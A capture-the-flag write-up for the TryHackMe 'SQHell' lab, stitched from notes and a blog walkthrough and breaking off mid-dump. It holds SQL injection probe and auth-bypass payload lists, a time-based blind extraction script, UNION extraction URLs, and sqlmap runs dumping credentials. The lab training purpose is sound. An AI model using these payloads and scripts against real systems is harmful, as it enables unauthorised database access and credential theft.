# SQHell

**Room Link:** [https://tryhackme.com/room/sqhell](https://tryhackme.com/room/sqhell)



Put in SQL Injection notes

[https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---browser-method](https://pencer.io/ctf/ctf-thm-sqhell/#flag-4---out-of-band---browser-method)

## **Scans**

Initial scan

**Kali**

```
nmap -A $VICTIM
```

<figure><img src="../../.gitbook/assets/image (799).png" alt=""><figcaption></figcaption></figure>

Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 $VICTIM
```

<figure><img src="../../.gitbook/assets/image (803).png" alt=""><figcaption></figcaption></figure>



## TCP/80 - HTTP

**Kali**

```
gobuster dir -u http://$VICTIM -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

<figure><img src="../../.gitbook/assets/image (804).png" alt=""><figcaption></figcaption></figure>





## Flag 1

<figure><img src="../../.gitbook/assets/image (800).png" alt=""><figcaption></figcaption></figure>





<figure><img src="../../.gitbook/assets/image (801).png" alt=""><figcaption></figcaption></figure>

**List**

```
'
"
`
')
")
`)
'))
"))
`))
1' ORDER BY 1--+
1' ORDER BY 2--+
1' ORDER BY 3--+
1' ORDER BY 4--+
1' GROUP BY 1--+
1' GROUP BY 2--+
1' GROUP BY 3--+
1' GROUP BY 4--+
1' UNION SELECT null-- -
1' UNION SELECT null,null-- -
1' UNION SELECT null,null,null-- -
1' UNION SELECT null,null,null,null-- -
1' UNION SELECT null,null,null,null,null-- -
```



<figure><img src="../../.gitbook/assets/image (802).png" alt=""><figcaption></figcaption></figure>









## Flag 2



<figure><img src="../../.gitbook/assets/image (805).png" alt=""><figcaption></figcaption></figure>

### Blind/Time - Curl Method <a href="#flag-2---blindtime---curl-method" id="flag-2---blindtime---curl-method"></a>

This command gets the page right away

**Kali**

```
curl -H "X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,1,1))) = '86'); --+" http://$VICTIM
```

Changing the 86 to 84 there is a delay of 5 seconds.

**Kali**

```
curl -H "X-Forwarded-For:1' AND (SELECT sleep(5) FROM flag where (ASCII(SUBSTR(flag,1,1))) = '84'); --+" http://$VICTIM
```

**flag.py**

```
import requests
import time
import string

server = "10.10.157.66" # IP OR SERVERNAME IF IN HOST FILE
flag = ""
loop = 1

while chr(125) not in flag:
    for a in range(48,126):
        start = time.time()
        r = requests.get(url="http://" + server, headers={'X-Forwarded-For':f"1' AND (SELECT sleep(2) FROM flag where (ASCII(SUBSTR(flag,{loop},1))) = '{a}'); --+"})
        end = time.time()
        if end-start >= 2:
            flag += chr(a)
            loop += 1
            print("Finding Flag: ", flag, end="\r")
            break
print("Flag found: ", flag)
```

**Kali**

```
python flag.py
```

<figure><img src="../../.gitbook/assets/image (806).png" alt=""><figcaption></figcaption></figure>

## Flag 3 - Blind/Boolean - Curl Method

&#x20;

### &#x20;<a href="#machine-information" id="machine-information"></a>



### SQL Injection Info <a href="#sql-injection-info" id="sql-injection-info"></a>

Looking at the room description we’re told specifically to find five different flags using various types SQL injection:

```
There are 5 flags to find but you have to defeat the different SQL injection types.
Hint: Unless displayed on the page the flags are stored in the flag table in the flag column.
```

There are a ton of great resources out there on the internet to help with SQLi. A few good ones that have helped me are [this](https://github.com/Y000o/sql\_injection\_basic/blob/master/sql\_injection\_basic\_en.md), and [this](https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet), which both have lots of information and examples. There’s also this [cheatsheet](https://cheatography.com/binca/cheat-sheets/sql-injection) which is nicely laid out, and [this](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet) one which has a good list of boolean based examples to try. Finally [this](https://www.acunetix.com/websitesecurity/sql-injection2/) article is a good introduction to the five basic type of SQL injection.

In real life we need to use different tools depending on the scenario. So for this room I’m going to cover the flags using some or all of these methods for each:

```
Browser (FireFox)
Curl
BurpSuite
SQLMap
```

For BurpSuite I’m using FoxyProxy to redirect my browser to it. Here’s the config needed in case you haven’t got it set up:

![sqhell-foxy-burp](https://pencer.io/assets/images/2021-06-08-22-36-12.png)

### Initial Access[Permalin](https://pencer.io/ctf/ctf-thm-sqhell/#initial-access) <a href="#initial-access" id="initial-access"></a>

First let’s add the server IP to our hosts file:

```
┌──(root💀kali)-[~/thm/internal]
└─# echo 10.10.164.142 sqhell.thm >> /etc/hosts
```

Now we can have a look at the website:

![sqhell-website](https://pencer.io/assets/images/2021-06-08-21-44-26.png)

We have a simple static html based website with five areas for us to exploit. Let’s start on the first flag.

### Flag 1 - In-Band/Error Based - Browser Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---browser-method) <a href="#flag-1---in-banderror-based---browser-method" id="flag-1---in-banderror-based---browser-method"></a>

The first flag is the easiest, start by clicking on the Login button which takes us here:

![sqhell-login](https://pencer.io/assets/images/2021-06-08-21-59-04.png)

We have username and password boxes, it’s safe to assume we’ll be doing a simple sql injection authentication bypass technique here.

I tried a few different ones from the cheatsheet mentioned above, this was the one that worked for me:

```
admin' or '1'='1
```

Simply enter that in the Username field and press Login:

![sqhell-admin-bypass](https://pencer.io/assets/images/2021-06-08-22-20-14.png)

We are taken to another page which reveals the first flag:

![sqhell-browser-1](https://pencer.io/assets/images/2021-06-08-22-21-09.png)

### Flag 1 - In-Band/Error Based - Curl Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---curl-method) <a href="#flag-1---in-banderror-based---curl-method" id="flag-1---in-banderror-based---curl-method"></a>

We can also do this using curl, with the same authentication bypass technique. To automate the process of finding which one works I copied the examples from the cheatsheet [here](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet) to a file:

```
┌──(root💀kali)-[~/thm/diffctf]
└─# cat bypass.txt
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
<SNIP>
```

Then used a simple loop in BASH to read each line and try it against the website:

```
┌──(root💀kali)-[~/thm/diffctf]
└─# while IFS="" read -r p || [ -n "$p" ]
do
  printf '%s' "$p"; curl -s -d "username=$p" -d "password=" http://sqhell.thm/login | grep THM; printf "\n"
done < bypass.txt

or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #                            <p>THM{FLAG1:<HIDDEN>}</p>
admin'/*
admin' or '1'='1                    <p>THM{FLAG1:<HIDDEN>}</p>
admin' or '1'='1'--
admin' or '1'='1'#                  <p>THM{FLAG1:<HIDDEN>}</p>
admin' or '1'='1'/*
admin'or 1=1 or ''='                <p>THM{FLAG1:<HIDDEN>}</p>
admin' or 1=1
admin' or 1=1--
admin' or 1=1#                      <p>THM{FLAG1:<HIDDEN>}</p>
<SNIP>
```

As you can see quite a few different ones worked.

### Flag 1 - In-Band/Error Based - Burp Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---burp-method) <a href="#flag-1---in-banderror-based---burp-method" id="flag-1---in-banderror-based---burp-method"></a>

We can use Burp to intercept the browser request. First make sure you have FoxyProxy on and set to use Burp, then use anything for the username:

![sqhell-foxy-config](https://pencer.io/assets/images/2021-06-08-22-40-10.png)

With Intercept set to On in Burp, when you click the Login button in your browser it gets redirected and caught:

![sqhell-burp-intercept](https://pencer.io/assets/images/2021-06-08-22-43-08.png)

Right click anywhere on the text and chose Send to Intruder. Check the last line has something within $ set against the username field, this is the variable that Burp will replace with our word list:

![sqhell-burp-1](https://pencer.io/assets/images/2021-06-08-22-30-06.png)

Switch to the Payloads tab and load a list of bypass techniques to try. I used the same file I’d copied them in to for the above curl method:

![sqhell-burp-intruder](https://pencer.io/assets/images/2021-06-09-22-02-49.png)

Click the Start Attack button and wait for burp to try everything from your list. Looking at the results you’ll see a few lines with a smaller length to the others. If you switch to the response tab you can see these are the responses containing our flag:

![sqhell-burp-results](https://pencer.io/assets/images/2021-06-09-22-08-44.png)

### Flag 1 - In-Band/Error Based - SQLMap Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-1---in-banderror-based---sqlmap-method) <a href="#flag-1---in-banderror-based---sqlmap-method" id="flag-1---in-banderror-based---sqlmap-method"></a>

The last method to look at is arguably the easiest. Once you know how to use SQLMap it makes the process of discovery and enumeration much easier. If we pretend we don’t know the login page is vulnerable then let’s follow the process we could use to exploit the page. [This](https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap) is a useful post on using SQLMap for SQLi.

First we run an initial scan to see what SQLMap can discover about the database behind the logon page:

```
┌──(root💀kali)-[/home/kali/sqhell]
└─# sqlmap -u "http://sqhell.thm/login" --data "username=admin&password=admin"
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.5.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
[*] starting @ 22:54:26 /2021-06-08/
[22:54:26] [INFO] testing connection to the target URL
[22:54:26] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:54:26] [INFO] testing if the target URL content is stable
[22:54:27] [INFO] target URL content is stable
[22:54:27] [INFO] testing if POST parameter 'username' is dynamic
[22:54:27] [WARNING] POST parameter 'username' does not appear to be dynamic
[22:54:27] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[22:54:27] [INFO] testing for SQL injection on POST parameter 'username'
[22:54:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:54:27] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[22:54:27] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[22:54:27] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[22:54:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[22:54:28] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[22:54:28] [INFO] testing 'Generic inline queries'
[22:54:28] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[22:54:28] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[22:54:28] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[22:54:29] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:54:39] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[22:55:04] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:55:04] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:55:05] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 
[22:55:22] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[22:55:22] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 95 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 8740 FROM (SELECT(SLEEP(5)))NuAN) AND 'ofyh'='ofyh&password=admin
---
[22:55:43] [INFO] the back-end DBMS is MySQL
[22:55:43] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
[22:55:43] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/sqhell.thm'
[*] ending @ 22:55:43 /2021-06-08/
```

There’s a lot of information, the key point is:

```
[22:55:22] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable.
```

With the information gathered we can tell SQLMap to use the username and password fields, set the database to mysql, and dump the databases it can find:

```
┌──(root💀kali)-[~/thm/sqhell]
└─# sqlmap -u "http://sqhell.thm/login" --method=POST --data="username=admin&password=" -p "username,password" --dbms=mysql --dbs --threads 10
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.5.5#stable}
|_ -| . [,]     | .'| . |
|___|_  ["]_|_|_|__,|_|
      |_|V...       |_|   http://sqlmap.org
[*] starting @ 22:32:24 /2021-06-09/
[22:32:24] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[22:32:24] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 8790 FROM (SELECT(SLEEP(5)))OuEH) AND 'jtUB'='jtUB&password=admin
---
[22:32:25] [INFO] testing MySQL
[22:32:34] [INFO] confirming MySQLize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[22:32:34] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
[22:32:45] [INFO] adjusting time delay to 1 second due to good response times
[22:32:45] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[22:32:45] [INFO] fetching database names
[22:32:45] [INFO] fetching number of databases
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] 
[22:32:45] [INFO] resumed: 2
[22:32:45] [INFO] resumed: information_schema
[22:32:45] [INFO] resumed: sqhell_2
available databases [2]:
[*] information_schema
[*] sqhell_2
[22:32:45] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/sqhell.thm'
[*] ending @ 22:32:45 /2021-06-09/
```

Again, a lot of information but the important part is the database it found:

```
[*] sqhell_2
```

Next we can ask SQLMap to dump the contents of that database:

```
┌──(root💀kali)-[~/thm/sqhell]
└─# sqlmap -u "http://sqhell.thm/login" --method=POST --data="username=admin&password=" -p "username,password" --dbms=mysql -D sqhell_2 --dump-all --threads 10
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.5.5#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
[*] starting @ 22:37:42 /2021-06-09/
[22:37:42] [WARNING] provided value for parameter 'password' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[22:37:42] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 8790 FROM (SELECT(SLEEP(5)))OuEH) AND 'jtUB'='jtUB&password=admin
---
[22:37:43] [INFO] testing MySQL
[22:37:43] [INFO] confirming MySQL
[22:37:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[22:37:43] [INFO] fetching tables for database: 'sqhell_2'
[22:37:43] [INFO] fetching number of tables for database 'sqhell_2'
multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] 
[22:37:44] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)
[22:37:45] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] 
[22:37:53] [INFO] retrieved: 
[22:38:03] [INFO] adjusting time delay to 1 second due to good response times
[22:38:17] [INFO] fetching columns for table 'users' in database 'sqhell_2'
[22:38:17] [INFO] retrieved: 3
[22:38:21] [INFO] retrieved: id
[22:38:27] [INFO] retrieved: username
[22:38:52] [INFO] retrieved: password
[22:39:21] [INFO] fetching entries for table 'users' in database 'sqhell_2'
[22:39:21] [INFO] fetching number of entries for table 'users' in database 'sqhell_2'
[22:39:21] [INFO] retrieved: 1
[22:39:23] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
[22:39:26] [INFO] retrieved: icantrememberthispasswordcanyou
[22:41:05] [INFO] retrieved: admin
Database: sqhell_2
Table: users
[1 entry]
+----+---------------------------------+----------+
| id | password                        | username |
+----+---------------------------------+----------+
| 1  | icantrememberthispasswordcanyou | admin    |
+----+---------------------------------+----------+
[22:41:21] [INFO] table 'sqhell_2.users' dumped to CSV file '/root/.local/share/sqlmap/output/sqhell.thm/dump/sqhell_2/users.csv'
[22:41:21] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/sqhell.thm'
[*] ending @ 22:41:21 /2021-06-09/
```

With the password found for the admin user we can either login in via the browser or use curl again to get the flag:

```
┌──(root💀kali)-[/home/kali/sqhell]
└─$ curl -s -d "username=admin" -d "password=icantrememberthispasswordcanyou" http://sqhell.thm/login
<!DOCTYPE html>
<html lang="en">
<SNIP
<div class="container" style="margin-top:20px">
    <h1 class="text-center">Logged In</h1>
    <div class="row">
        <div class="col-md-6 col-md-offset-3">
            <form method="post">
                <div class="panel panel-default" style="margin-top:50px">
                    <div class="panel-heading">Logged In</div>
                    <div class="panel-body">
                        <div class="alert alert-success text-center" style="margin:10px">
                            <p>THM{FLAG1:<HIDDEN>}</p>
                        </div>
                    </div>
                </div>
            </form>
        </div>
    </div>
</div>
</body>
</html>
```

Ok, that was four different ways to get flag 1. Let’s move on to the next flag.

### Flag 5 - In-Band/Union - Browser Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---browser-method) <a href="#flag-5---in-bandunion---browser-method" id="flag-5---in-bandunion---browser-method"></a>

The next easiest flag is number five. For this one we’ll be using parameter tampering and a UNION based exploit. I did another TryHackMe room called Jurassic Park where I used the same techniques as follows, you can see that post [here.](https://pencer.io/ctf/ctf-thm-jurassic-park). There’s also helpful articles [here](https://www.acunetix.com/blog/articles/exploiting-sql-injection-example) and [here](https://book.hacktricks.xyz/pentesting-web/sql-injection) that are worth a read.

First let’s see what we have:

![sqhell-posts](https://pencer.io/assets/images/2021-06-10-22-00-58.png)

We’re looking at one of the posts and can see it has a parameter on the end of the URL, in this case it’s ID=1. There’s lots of ways to check if this is vulnerable, probably the easiest is to add a ‘ on the end:

![sqhell-apostrophe](https://pencer.io/assets/images/2021-06-10-22-07-45.png)]

It says there’s an error in our syntax, which tells us our extra character on the end wasn’t removed. We could also do something simple like AND 1=1:

![sqhell-and1=1](https://pencer.io/assets/images/2021-06-10-22-10-25.png)

As before we can see the statement was evaluated with our extra part on the end. In this instance AND 1=1 is true so the page appears as normal. Now we know it’s vulnerable we can start to dig deeper.

First we want to know how many columns are in the table. We start at 1 and add columns until we get an error:

![sqhell-columns](https://pencer.io/assets/images/2021-06-10-22-13-56.png)

So here I did ORDER BY 1 then ORDER BY 1,2 and so on until I got to 5. The error at that point tells us there are four columns. Next we want to see which of those columns are useable:

```
http://sqhell.thm/post?id=99 union all select 1,2,3,4
```

![sqhell-union-all](https://pencer.io/assets/images/2021-06-10-22-17-03.png)

The UNION ALL statement is used to show us which column appears where on the page. We want the output to be visible, otherwise we won’t be able to see the data we retrieve. We can see column three is the main section of the page, so plenty of room for our output. We’ll use that one for all our subsequent commands.

Let’s get the database name:

```
http://sqhell.thm/post?id=99 union all select 1,2,database(),4
```

![sqhell-union-database](https://pencer.io/assets/images/2021-06-10-22-20-11.png)

Now we want the tables in the database:

```
http://sqhell.thm/post?id=99 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()
```

![sqhell-union-tables](https://pencer.io/assets/images/2021-06-10-22-22-27.png)

Finally we see the tables in the database, flag sounds like the one we’re looking for. Let’s have a look at the contents of it:

```
http://sqhell.thm/post?id=99 union select 1,2,flag,4 from flag
```

![sqhell-union-flag](https://pencer.io/assets/images/2021-06-10-22-31-25.png)

We have the flag. Let’s move on to a different method.

### Flag 5 - In-Band/Union - Curl Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---curl-method) <a href="#flag-5---in-bandunion---curl-method" id="flag-5---in-bandunion---curl-method"></a>

I went in to detail on the last flag on using curl instead of the browser. If you can use a browser you would because it’s easier, but in case it’s not possible here’s how to do this flag using curl.

First check how many columns we have:

```
┌──(root💀kali)-[~/thm/sqhell]
└─# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1"
Post not found
┌──(root💀kali)-[~/thm/sqhell]
└─# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1,2"
Post not found
┌──(root💀kali)-[~/thm/sqhell]
└─# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1,2,3"
Post not found
┌──(root💀kali)-[~/thm/sqhell]
└─# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1,2,3,4"
Post not found
┌──(root💀kali)-[~/thm/sqhell]
└─# curl -s "http://sqhell.thm/post?id=99 ORDER BY 1,2,3,4,5"
Unknown column '5' in 'order clause'
```

We have four columns, as before we check to see which one is useable to display the data we retrieve:

```
┌──(root💀kali)-[~/thm/sqhell]
└─# curl -s "http://sqhell.thm/post?id=99 union all select 1,2,3,4" | grep -A 1 panel-body
                <div class="panel-body">
                    3                </div>
```

I use grep to filter the output down to just the body of the response. We see column three is the one to use. Let’s find the database name:

```
┌──(root💀kali)-[~/thm/sqhell]
└─# curl -s "http://sqhell.thm/post?id=99 union all select 1,2,database(),4" | grep -A 1 panel-body 
                <div class="panel-body">
                    sqhell_5                </div>
```

Now find the tables in it:

```
┌──(root💀kali)-[~/thm/sqhell]
└─# curl -s "http://sqhell.thm/post?id=99 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()" | grep -A 1 panel-body
                <div class="panel-body">
                    flag,posts,users                </div>
```

Then get the flag from the table:

```
┌──(root💀kali)-[~/thm/sqhell]
└─# curl -s "http://sqhell.thm/post?id=99 union select 1,2,flag,4 from flag" | grep -A 1 panel-body
                <div class="panel-body">
                    THM{FLAG5:<HIDDEN>}                </div>
```

### Flag 5 - In-Band/Union - SQLMap Method[Permalink](https://pencer.io/ctf/ctf-thm-sqhell/#flag-5---in-bandunion---sqlmap-method) <a href="#flag-5---in-bandunion---sqlmap-method" id="flag-5---in-bandunion---sqlmap-method"></a>

Moving on to SQLMap and like flag 1, this is pretty simple. First check for the post page parameter for vulnerability and find any databases:

```
┌──(root💀kali)-[~/thm/sqhell]
└─# sqlmap -u "http://sqhell.thm/post?id=2" -p "id" --dbs --dbms=mysql --threads 10
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
[*] starting @ 22:41:33 /2021-06-10/
[22:41:33] [INFO] testing connection to the target URL
[22:41:33] [INFO] checking if the target is protected by some kind of WAF/IPS
[22:41:33] [INFO] testing if the target URL content is stable
[22:41:33] [INFO] target URL content is stable
[22:41:33] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[22:41:33] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[22:41:33] [INFO] testing for SQL injection on GET parameter 'id'
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 
[22:41:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:41:34] [WARNING] reflective value(s) found and filtering out
[22:41:35] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="View")
[22:41:35] [INFO] testing 'Generic inline queries'
[22:41:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:41:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[22:41:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[22:41:35] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[22:41:35] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[22:41:35] [INFO] GET parameter 'id' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[22:41:35] [INFO] testing 'MySQL inline queries'
[22:41:35] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:41:35] [WARNING] time-based comparison requires larger statistical model, please wait................ (done)
[22:41:46] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[22:41:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:41:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[22:41:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:41:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:41:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:41:56] [INFO] target URL appears to have 4 columns in query
[22:41:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 52 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2 AND 7533=7533

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=2 AND GTID_SUBSET(CONCAT(0x716a6b7071,(SELECT (ELT(3773=3773,1))),0x716a767071),3773)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=2;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2 AND (SELECT 1146 FROM (SELECT(SLEEP(5)))RxrU)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=-3834 UNION ALL SELECT NULL,CONCAT(0x716a6b7071,0x52756b6441764b664548654d68494b726b4477706d7955444c66446a50665864577a784e77435848,0x716a767071),NULL,NULL-- -
---
[22:41:58] [INFO] the back-end DBMS is MySQL
[22:41:58] [WARNING] potential permission problems detected ('command denied')
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.6
[22:41:58] [INFO] fetching database names
available databases [2]:
[*] information_schema
[*] sqhell_5
[22:41:59] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/sqhell.thm'
[*] ending @ 22:41:59 /2021-06-10/
```

As before, we’ve found the database is called sqhell\_5, now dump everything:

```
┌──(root💀kali)-[~/thm/sqhell]
└─# sqlmap -u "http://sqhell.thm/post?id=2" -p "id" --dbms=mysql -D sqhell_5 --dump-all --threads 10
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.5.5#stable}
|_ -| . [(]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org
[*] starting @ 22:50:52 /2021-06-10/
[22:50:52] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2 AND 7533=7533

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=2 AND GTID_SUBSET(CONCAT(0x716a6b7071,(SELECT (ELT(3773=3773,1))),0x716a767071),3773)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: id=2;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=2 AND (SELECT 1146 FROM (SELECT(SLEEP(5)))RxrU)

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=-3834 UNION ALL SELECT NULL,CONCAT(0x716a6b7071,0x52756b6441764b664548654d68494b726b4477706d7955444c66446a50665864577a784e77435848,0x716a767071),NULL,NULL-- -
---
[22:50:52] [INFO] testing MySQL
[22:50:52] [INFO] confirming MySQL
[22:50:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 8.0.0
[22:50:52] [INFO] fetching tables for database: 'sqhell_5'
[22:50:52] [INFO] fetching columns for table 'posts' in database 'sqhell_5'
[22:50:52] [INFO] fetching entries for table 'posts' in database 'sqhell_5'
Database: sqhell_5
Table: posts
[2 entries]
[22:50:52] [INFO] table 'sqhell_5.posts' dumped to CSV file '/root/.local/share/sqlmap/output/sqhell.thm/dump/sqhell_5/posts.csv'
[22:50:52] [INFO] fetching columns for table 'users' in database 'sqhell_5'
[22:50:52] [INFO] fetching entries for table 'users' in database 'sqhell_5'
Database: sqhell_5
Table: users
[1 entry]
+----+----------+----------+
| id | password | username |
+----+----------+----------+
| 1  | password | admin    |
+----+----------+----------+
[22:50:52] [INFO] table 'sqhell_5.users' dumped to CSV file '/root/.local/share/sqlmap/output/sqhell.thm/dump/sqhell_5/users.csv'
[22:50:52] [INFO] fetching columns for table 'flag' in database 'sqhell_5'
